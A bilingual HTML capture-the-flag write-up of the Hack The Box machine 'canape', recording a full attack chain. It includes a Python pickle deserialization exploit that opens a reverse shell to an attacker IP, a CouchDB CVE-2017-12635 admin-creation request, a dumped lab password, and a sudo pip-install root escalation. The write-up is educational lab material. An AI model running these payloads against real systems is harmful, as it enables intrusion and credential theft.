@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>canape | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">canape</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Flask web application with a Git repository exposed at <code>git.canape.htb</code>, which allowed me to download the complete source code and analyze it. The application had a hidden check functionality that used Python's <code>cPickle</code> to deserialize user-supplied data without proper validation, leading to arbitrary code execution.</p>
+                    
+                    <p>By crafting a malicious pickle payload that bypassed the character whitelist validation, I achieved remote code execution and gained initial access as the <code>www-data</code> user. During enumeration, I discovered a CouchDB instance running on port 5984 that contained a password database, but it required authentication.</p>
+                    
+                    <p>I exploited CVE-2017-12635, a privilege escalation vulnerability in CouchDB 2.0.0 that allows creating admin users through duplicate role keys in the user creation request. After gaining admin access to CouchDB, I retrieved credentials for the <code>homer</code> user from the passwords database. Finally, I escalated to root by exploiting sudo permissions on <code>pip install</code>, creating a malicious Python package that executed a shell when installed with sudo privileges.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Python pickle deserialization RCE, CouchDB CVE-2017-12635 privilege escalation, pip install sudo abuse for privilege escalation.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I start with an nmap scan to identify open ports and services on the target machine:</p>
+                <p><img src="./media/image4.png"
+                        alt="Nmap scan results showing open ports including HTTP on port 80 and SSH relocated to port 65535" />
+                </p>
+
+                <p>The scan reveals a typical setup with ports 22 and 80, though SSH has been relocated to port 65535. Port 80 is running an HTTP server which will be our primary attack surface.</p>
+
+                <h2>Web Enumeration - Git Repository Discovery</h2>
+                <p>I add both <code>canape.htb</code> and <code>git.canape.htb</code> to my <code>/etc/hosts</code> file. Navigating to the git subdomain, I discover an exposed Git repository that I can clone remotely:</p>
+                <pre><code class="language-bash">git clone http://git.canape.htb/</code></pre>
+
+                <p>This gives me access to the complete source code of the application and all commit history. While reviewing the code, I find interesting configuration details that will be useful later during privilege escalation:</p>
+
+                <pre><code class="language-python">app = Flask(__name__)
+app.config.update(
+    DATABASE = "simpsons"
+)
+db = couchdb.Server("http://localhost:5984/")[app.config["DATABASE"]]</code></pre>
+
+                <p>This reveals that there's likely a CouchDB database running internally on port 5984, which isn't externally accessible but may be exploitable from within the system.</p>
+
+                <h2>Application Analysis - Simpsons Quote Website</h2>
+                <p>The main application is a Simpsons quotes website where users can submit and view character quotes:</p>
+                <p><img src="./media/image1.png" alt="Simpsons quotes web application showing the main interface" /></p>
+
+                <p>Analyzing the Git commit history, I discover that a certain functionality was hidden from the frontend due to "vulnerabilities":</p>
+                <p><img src="./media/image2.png"
+                        alt="Git commit showing code that hides the check functionality due to vulnerabilities" /></p>
+
+                <h2>Vulnerability Discovery - Pickle Deserialization</h2>
+                <p>After thoroughly investigating and analyzing the source code, I identify the critical vulnerability in the <code>/check</code> endpoint. The vulnerable line is:</p>
+
+                <pre><code class="language-python">item = cPickle.loads(data)</code></pre>
+
+                <p>This <code>cPickle.loads()</code> method deserializes user input, and if that input contains executable code, it will be executed during the deserialization process. This is a classic insecure deserialization vulnerability.</p>
+
+                <h3>Understanding the Application Flow</h3>
+                <p>The application works as follows:</p>
+                <ol>
+                    <li>When a user submits a character name and quote via <code>POST /submit</code>, the server calculates the MD5 hash of character + quote and stores it in <code>/tmp/md5.p</code></li>
+                    <li>The <code>POST /check</code> endpoint reads the file by its MD5 hash and checks if the content contains the string "p1"</li>
+                    <li>If it does, it attempts to deserialize the content using <code>cPickle.loads()</code></li>
+                    <li>However, there's a whitelist validation that only allows specific character names</li>
+                </ol>
+
+                <p>The character whitelist is defined as:</p>
+                <pre><code class="language-python">WHITELIST = [
+    "homer",
+    "marge",
+    "bart",
+    "lisa",
+    "maggie",
+    "moe",
+    "carl",
+    "krusty"
+]</code></pre>
+
+                <h2>Initial Access - Crafting the Pickle Exploit</h2>
+                <p>I find a useful pickle payload generator at <a
+                        href="https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd">this GitHub Gist</a> that demonstrates how to create malicious pickle payloads:</p>
+
+                <pre><code class="language-python">import cPickle
+import sys
+import base64
+
+DEFAULT_COMMAND = "netcat -c '/bin/bash -i' -l -p 4444"
+COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND
+
+class PickleRce(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(COMMAND,))
+
+print base64.b64encode(cPickle.dumps(PickleRce()))</code></pre>
+
+                <p>This code creates a pickle payload that, when deserialized on the victim server, executes an arbitrary command. Since this machine is from 2018 and uses Python 2, I use <code>pyenv</code> to install Python 2.7 for compatibility:</p>
+
+                <pre><code class="language-bash">pyenv install 2.7
+pyenv shell 2.7</code></pre>
+
+                <h3>Bypassing the Whitelist</h3>
+                <p>I modify the exploit to send a reverse shell and bypass the whitelist validation. The trick is to include a whitelisted character name followed by a colon, which will cause an error but satisfies the whitelist requirement:</p>
+
+                <pre><code class="language-python">import os
+import cPickle
+from hashlib import md5
+import requests
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('homer:;bash -i >& /dev/tcp/10.10.16.6/443 0>&1',))
+
+shellcode = cPickle.dumps(Exploit())
+
+requests.post("http://canape.htb/submit", 
+    data={'character': shellcode.split(":")[0], 
+          'quote': shellcode.split(":")[1]})
+
+requests.post("http://canape.htb/check", 
+    data={'id': md5(shellcode.split(":")[0] + shellcode.split(":")[1]).hexdigest()})</code></pre>
+
+                <p>The exploit works as follows:</p>
+                <ol>
+                    <li>Create a reverse shell payload with "homer:" prefix (causes an error but passes whitelist)</li>
+                    <li>Split the payload by ":" to separate character and quote</li>
+                    <li>Send the payload to the server via <code>/submit</code></li>
+                    <li>Calculate the MD5 hash and call <code>/check</code> to trigger deserialization</li>
+                    <li>Receive the reverse shell connection</li>
+                </ol>
+
+                <p>I set up a netcat listener:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>After running the exploit, I successfully receive a shell as <code>www-data</code>. I upgrade the TTY for better interaction:</p>
+                <pre><code class="language-bash">python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+# Press Ctrl+Z
+stty raw -echo; fg</code></pre>
+
+                <h2>Enumeration - CouchDB Discovery</h2>
+                <p>During enumeration, I see a user named <code>homer</code> in <code>/home</code>. Remembering the database configuration from the source code, I check for listening ports:</p>
+
+                <pre><code class="language-bash">ss -tuln</code></pre>
+
+                <p>This confirms that CouchDB is running on port 5984. I research how to interact with CouchDB and learn it's a NoSQL database that can be accessed via HTTP methods like GET and POST.</p>
+
+                <h3>Initial Database Enumeration</h3>
+                <p>I start exploring the database:</p>
+                <pre><code class="language-bash">curl http://localhost:5984/</code></pre>
+
+                <p>Response:</p>
+                <pre><code class="language-json">{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}</code></pre>
+
+                <p>Listing all databases:</p>
+                <pre><code class="language-bash">curl http://localhost:5984/_all_dbs</code></pre>
+
+                <p>Response:</p>
+                <pre><code class="language-json">["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]</code></pre>
+
+                <p>The <code>passwords</code> database looks very interesting. I try to access it:</p>
+                <pre><code class="language-bash">curl http://localhost:5984/passwords/_all_docs?include_docs=true</code></pre>
+
+                <p>Response:</p>
+                <pre><code class="language-json">{"error":"unauthorized","reason":"You are not authorized to access this db."}</code></pre>
+
+                <p>Similarly, trying to access the <code>_users</code> database:</p>
+                <pre><code class="language-bash">curl http://localhost:5984/_users/_all_docs?include_docs=true</code></pre>
+
+                <p>Response:</p>
+                <pre><code class="language-json">{"error":"unauthorized","reason":"You are not a server admin."}</code></pre>
+
+                <p>The <code>simpsons</code> database only contains character quotes. I need admin credentials to access the sensitive databases.</p>
+
+                <h2>Privilege Escalation in CouchDB - CVE-2017-12635</h2>
+                <p>I search for exploits affecting CouchDB version 2.0.0 and discover CVE-2017-12635, which allows privilege escalation within CouchDB through duplicate role keys in user creation requests. More information can be found at <a
+                        href="https://www.cvedetails.com/cve/CVE-2017-12635/">CVE Details</a>.</p>
+
+                <h3>Creating an Admin User</h3>
+                <p>The vulnerability allows me to create a user with admin privileges by including duplicate <code>roles</code> keys in the JSON payload:</p>
+
+                <pre><code class="language-bash">curl -X PUT -d '{"type":"user","name":"xd","roles":["_admin"],"roles":[],"password":"xd"}' \
+    localhost:5984/_users/org.couchdb.user:xd \
+    -H "Content-Type:application/json"</code></pre>
+
+                <p>Now that my user <code>xd</code> has admin privileges, I can access the passwords database:</p>
+                <pre><code class="language-bash">curl http://xd:xd@localhost:5984/passwords/_all_docs?include_docs=true</code></pre>
+
+                <p>This reveals stored credentials:</p>
+                <p><img src="./media/image3.png"
+                        alt="CouchDB passwords database showing credentials for users including homer" /></p>
+
+                <p>I extract the following credentials:</p>
+                <pre><code class="language-plaintext">homer:0B4jyA0xtytZi7esBNGp</code></pre>
+
+                <h2>Lateral Movement - SSH as Homer</h2>
+                <p>Using the discovered credentials, I successfully SSH into the machine as <code>homer</code> on port 65535:</p>
+                <pre><code class="language-bash">ssh homer@canape.htb -p 65535</code></pre>
+
+                <p>After logging in, I can retrieve the user flag from homer's home directory.</p>
+
+                <h2>Privilege Escalation to Root - Pip Install Sudo Abuse</h2>
+                <p>I check what sudo privileges the <code>homer</code> user has:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>Output:</p>
+                <pre><code class="language-plaintext">User homer may run the following commands on canape:
+    (root) /usr/bin/pip install *</code></pre>
+
+                <p>The user can run <code>pip install</code> with any arguments as root without a password. This is a well-known privilege escalation vector documented on <a
+                        href="https://gtfobins.github.io/gtfobins/pip/#sudo">GTFOBins</a>.</p>
+
+                <h3>Creating a Malicious Python Package</h3>
+                <p>I create a malicious Python package that will execute a shell when installed. The technique works by creating a <code>setup.py</code> file with arbitrary code that runs during installation:</p>
+
+                <pre><code class="language-bash">TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo pip install $TF</code></pre>
+
+                <p>What happens here is:</p>
+                <ol>
+                    <li>Create a temporary directory</li>
+                    <li>Write a <code>setup.py</code> file that executes <code>/bin/sh</code> using <code>os.execl()</code></li>
+                    <li>Install the "package" with sudo, which runs <code>setup.py</code> as root</li>
+                    <li>The shell spawned by <code>setup.py</code> runs with root privileges</li>
+                </ol>
+
+                <p>After executing these commands, I successfully escalate to root:</p>
+                <pre><code class="language-bash">whoami</code></pre>
+                <pre><code class="language-plaintext">root</code></pre>
+
+                <p>I can now retrieve the root flag and complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación web Flask con un repositorio Git expuesto en <code>git.canape.htb</code>, lo que me permitió descargar el código fuente completo y analizarlo. La aplicación tenía una funcionalidad de verificación oculta que usaba <code>cPickle</code> de Python para deserializar datos proporcionados por el usuario sin validación adecuada, lo que condujo a la ejecución arbitraria de código.</p>
+                    
+                    <p>Creando un payload malicioso de pickle que evadía la validación de la whitelist de personajes, conseguí ejecución remota de código y obtuve acceso inicial como usuario <code>www-data</code>. Durante la enumeración, descubrí una instancia de CouchDB ejecutándose en el puerto 5984 que contenía una base de datos de contraseñas, pero requería autenticación.</p>
+                    
+                    <p>Exploté CVE-2017-12635, una vulnerabilidad de escalada de privilegios en CouchDB 2.0.0 que permite crear usuarios administradores mediante claves de rol duplicadas en la petición de creación de usuario. Tras obtener acceso de administrador a CouchDB, recuperé credenciales para el usuario <code>homer</code> desde la base de datos de contraseñas. Finalmente, escalé a root explotando permisos sudo en <code>pip install</code>, creando un paquete Python malicioso que ejecutaba una shell cuando se instalaba con privilegios sudo.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> RCE por deserialización de pickle de Python, escalada de privilegios en CouchDB CVE-2017-12635, abuso de sudo en pip install para escalada de privilegios.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en la máquina objetivo:</p>
+                <p><img src="./media/image4.png"
+                        alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo HTTP en el puerto 80 y SSH reubicado al puerto 65535" />
+                </p>
+
+                <p>El escaneo revela una configuración típica con los puertos 22 y 80, aunque SSH ha sido reubicado al puerto 65535. El puerto 80 ejecuta un servidor HTTP que será nuestra superficie de ataque principal.</p>
+
+                <h2>Enumeración Web - Descubrimiento del Repositorio Git</h2>
+                <p>Añado tanto <code>canape.htb</code> como <code>git.canape.htb</code> a mi archivo <code>/etc/hosts</code>. Navegando al subdominio git, descubro un repositorio Git expuesto que puedo clonar remotamente:</p>
+                <pre><code class="language-bash">git clone http://git.canape.htb/</code></pre>
+
+                <p>Esto me da acceso al código fuente completo de la aplicación y a todo el historial de commits. Mientras reviso el código, encuentro detalles de configuración interesantes que serán útiles más adelante durante la escalada de privilegios:</p>
+
+                <pre><code class="language-python">app = Flask(__name__)
+app.config.update(
+    DATABASE = "simpsons"
+)
+db = couchdb.Server("http://localhost:5984/")[app.config["DATABASE"]]</code></pre>
+
+                <p>Esto revela que probablemente hay una base de datos CouchDB ejecutándose internamente en el puerto 5984, que no es accesible externamente pero puede ser explotable desde dentro del sistema.</p>
+
+                <h2>Análisis de la Aplicación - Web de Frases de Los Simpson</h2>
+                <p>La aplicación principal es una web de citas de Los Simpson donde los usuarios pueden enviar y ver frases de personajes:</p>
+                <p><img src="./media/image1.png" alt="Aplicación web de frases de Los Simpson mostrando la interfaz principal" /></p>
+
+                <p>Analizando el historial de commits de Git, descubro que cierta funcionalidad fue ocultada del frontend debido a "vulnerabilidades":</p>
+                <p><img src="./media/image2.png"
+                        alt="Commit de Git mostrando código que oculta la funcionalidad de verificación debido a vulnerabilidades" /></p>
+
+                <h2>Descubrimiento de Vulnerabilidad - Deserialización de Pickle</h2>
+                <p>Después de investigar y analizar minuciosamente el código fuente, identifico la vulnerabilidad crítica en el endpoint <code>/check</code>. La línea vulnerable es:</p>
+
+                <pre><code class="language-python">item = cPickle.loads(data)</code></pre>
+
+                <p>Este método <code>cPickle.loads()</code> deserializa entrada del usuario, y si esa entrada contiene código ejecutable, se ejecutará durante el proceso de deserialización. Esta es una vulnerabilidad clásica de deserialización insegura.</p>
+
+                <h3>Entendiendo el Flujo de la Aplicación</h3>
+                <p>La aplicación funciona de la siguiente manera:</p>
+                <ol>
+                    <li>Cuando un usuario envía un nombre de personaje y una frase vía <code>POST /submit</code>, el servidor calcula el hash MD5 de personaje + frase y lo almacena en <code>/tmp/md5.p</code></li>
+                    <li>El endpoint <code>POST /check</code> lee el archivo por su hash MD5 y verifica si el contenido contiene la cadena "p1"</li>
+                    <li>Si es así, intenta deserializar el contenido usando <code>cPickle.loads()</code></li>
+                    <li>Sin embargo, hay una validación de whitelist que solo permite nombres de personajes específicos</li>
+                </ol>
+
+                <p>La whitelist de personajes está definida como:</p>
+                <pre><code class="language-python">WHITELIST = [
+    "homer",
+    "marge",
+    "bart",
+    "lisa",
+    "maggie",
+    "moe",
+    "carl",
+    "krusty"
+]</code></pre>
+
+                <h2>Acceso Inicial - Creación del Exploit de Pickle</h2>
+                <p>Encuentro un generador útil de payloads de pickle en <a
+                        href="https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd">este Gist de GitHub</a> que demuestra cómo crear payloads maliciosos de pickle:</p>
+
+                <pre><code class="language-python">import cPickle
+import sys
+import base64
+
+DEFAULT_COMMAND = "netcat -c '/bin/bash -i' -l -p 4444"
+COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND
+
+class PickleRce(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(COMMAND,))
+
+print base64.b64encode(cPickle.dumps(PickleRce()))</code></pre>
+
+                <p>Este código crea un payload de pickle que, cuando se deserializa en el servidor víctima, ejecuta un comando arbitrario. Como esta máquina es de 2018 y usa Python 2, utilizo <code>pyenv</code> para instalar Python 2.7 por compatibilidad:</p>
+
+                <pre><code class="language-bash">pyenv install 2.7
+pyenv shell 2.7</code></pre>
+
+                <h3>Evadiendo la Whitelist</h3>
+                <p>Modifico el exploit para enviar una reverse shell y evadir la validación de la whitelist. El truco es incluir un nombre de personaje de la whitelist seguido de dos puntos, lo que causará un error pero satisface el requerimiento de la whitelist:</p>
+
+                <pre><code class="language-python">import os
+import cPickle
+from hashlib import md5
+import requests
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('homer:;bash -i >& /dev/tcp/10.10.16.6/443 0>&1',))
+
+shellcode = cPickle.dumps(Exploit())
+
+requests.post("http://canape.htb/submit", 
+    data={'character': shellcode.split(":")[0], 
+          'quote': shellcode.split(":")[1]})
+
+requests.post("http://canape.htb/check", 
+    data={'id': md5(shellcode.split(":")[0] + shellcode.split(":")[1]).hexdigest()})</code></pre>
+
+                <p>El exploit funciona así:</p>
+                <ol>
+                    <li>Crear un payload de reverse shell con prefijo "homer:" (causa error pero pasa la whitelist)</li>
+                    <li>Dividir el payload por ":" para separar personaje y frase</li>
+                    <li>Enviar el payload al servidor vía <code>/submit</code></li>
+                    <li>Calcular el hash MD5 y llamar a <code>/check</code> para desencadenar la deserialización</li>
+                    <li>Recibir la conexión de reverse shell</li>
+                </ol>
+
+                <p>Configuro un listener de netcat:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Después de ejecutar el exploit, recibo exitosamente una shell como <code>www-data</code>. Mejoro la TTY para mejor interacción:</p>
+                <pre><code class="language-bash">python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+# Pulsar Ctrl+Z
+stty raw -echo; fg</code></pre>
+
+                <h2>Enumeración - Descubrimiento de CouchDB</h2>
+                <p>Durante la enumeración, veo un usuario llamado <code>homer</code> en <code>/home</code>. Recordando la configuración de la base de datos del código fuente, compruebo los puertos en escucha:</p>
+
+                <pre><code class="language-bash">ss -tuln</code></pre>
+
+                <p>Esto confirma que CouchDB está ejecutándose en el puerto 5984. Investigo cómo interactuar con CouchDB y aprendo que es una base de datos NoSQL a la que se puede acceder mediante métodos HTTP como GET y POST.</p>
+
+                <h3>Enumeración Inicial de la Base de Datos</h3>
+                <p>Comienzo explorando la base de datos:</p>
+                <pre><code class="language-bash">curl http://localhost:5984/</code></pre>
+
+                <p>Respuesta:</p>
+                <pre><code class="language-json">{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}</code></pre>
+
+                <p>Listando todas las bases de datos:</p>
+                <pre><code class="language-bash">curl http://localhost:5984/_all_dbs</code></pre>
+
+                <p>Respuesta:</p>
+                <pre><code class="language-json">["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]</code></pre>
+
+                <p>La base de datos <code>passwords</code> parece muy interesante. Intento acceder a ella:</p>
+                <pre><code class="language-bash">curl http://localhost:5984/passwords/_all_docs?include_docs=true</code></pre>
+
+                <p>Respuesta:</p>
+                <pre><code class="language-json">{"error":"unauthorized","reason":"You are not authorized to access this db."}</code></pre>
+
+                <p>De forma similar, intentando acceder a la base de datos <code>_users</code>:</p>
+                <pre><code class="language-bash">curl http://localhost:5984/_users/_all_docs?include_docs=true</code></pre>
+
+                <p>Respuesta:</p>
+                <pre><code class="language-json">{"error":"unauthorized","reason":"You are not a server admin."}</code></pre>
+
+                <p>La base de datos <code>simpsons</code> solo contiene frases de personajes. Necesito credenciales de administrador para acceder a las bases de datos sensibles.</p>
+
+                <h2>Escalada de Privilegios en CouchDB - CVE-2017-12635</h2>
+                <p>Busco exploits que afecten a CouchDB versión 2.0.0 y descubro CVE-2017-12635, que permite escalada de privilegios dentro de CouchDB mediante claves de rol duplicadas en peticiones de creación de usuario. Más información se puede encontrar en <a
+                        href="https://www.cvedetails.com/cve/CVE-2017-12635/">CVE Details</a>.</p>
+
+                <h3>Creando un Usuario Administrador</h3>
+                <p>La vulnerabilidad me permite crear un usuario con privilegios de administrador incluyendo claves <code>roles</code> duplicadas en el payload JSON:</p>
+
+                <pre><code class="language-bash">curl -X PUT -d '{"type":"user","name":"xd","roles":["_admin"],"roles":[],"password":"xd"}' \
+    localhost:5984/_users/org.couchdb.user:xd \
+    -H "Content-Type:application/json"</code></pre>
+
+                <p>Ahora que mi usuario <code>xd</code> tiene privilegios de administrador, puedo acceder a la base de datos de contraseñas:</p>
+                <pre><code class="language-bash">curl http://xd:xd@localhost:5984/passwords/_all_docs?include_docs=true</code></pre>
+
+                <p>Esto revela credenciales almacenadas:</p>
+                <p><img src="./media/image3.png"
+                        alt="Base de datos de contraseñas de CouchDB mostrando credenciales para usuarios incluyendo homer" /></p>
+
+                <p>Extraigo las siguientes credenciales:</p>
+                <pre><code class="language-plaintext">homer:0B4jyA0xtytZi7esBNGp</code></pre>
+
+                <h2>Movimiento Lateral - SSH como Homer</h2>
+                <p>Usando las credenciales descubiertas, accedo exitosamente mediante SSH a la máquina como <code>homer</code> en el puerto 65535:</p>
+                <pre><code class="language-bash">ssh homer@canape.htb -p 65535</code></pre>
+
+                <p>Después de iniciar sesión, puedo recuperar la flag de usuario desde el directorio home de homer.</p>
+
+                <h2>Escalada de Privilegios a Root - Abuso de Pip Install con Sudo</h2>
+                <p>Compruebo qué privilegios sudo tiene el usuario <code>homer</code>:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>Salida:</p>
+                <pre><code class="language-plaintext">User homer may run the following commands on canape:
+    (root) /usr/bin/pip install *</code></pre>
+
+                <p>El usuario puede ejecutar <code>pip install</code> con cualquier argumento como root sin contraseña. Este es un vector de escalada de privilegios bien conocido documentado en <a
+                        href="https://gtfobins.github.io/gtfobins/pip/#sudo">GTFOBins</a>.</p>
+
+                <h3>Creando un Paquete Python Malicioso</h3>
+                <p>Creo un paquete Python malicioso que ejecutará una shell cuando se instale. La técnica funciona creando un archivo <code>setup.py</code> con código arbitrario que se ejecuta durante la instalación:</p>
+
+                <pre><code class="language-bash">TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo pip install $TF</code></pre>
+
+                <p>Lo que ocurre aquí es:</p>
+                <ol>
+                    <li>Crear un directorio temporal</li>
+                    <li>Escribir un archivo <code>setup.py</code> que ejecuta <code>/bin/sh</code> usando <code>os.execl()</code></li>
+                    <li>Instalar el "paquete" con sudo, lo que ejecuta <code>setup.py</code> como root</li>
+                    <li>La shell generada por <code>setup.py</code> se ejecuta con privilegios de root</li>
+                </ol>
+
+                <p>Después de ejecutar estos comandos, escalo exitosamente a root:</p>
+                <pre><code class="language-bash">whoami</code></pre>
+                <pre><code class="language-plaintext">root</code></pre>
+
+                <p>Ahora puedo recuperar la flag de root y completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
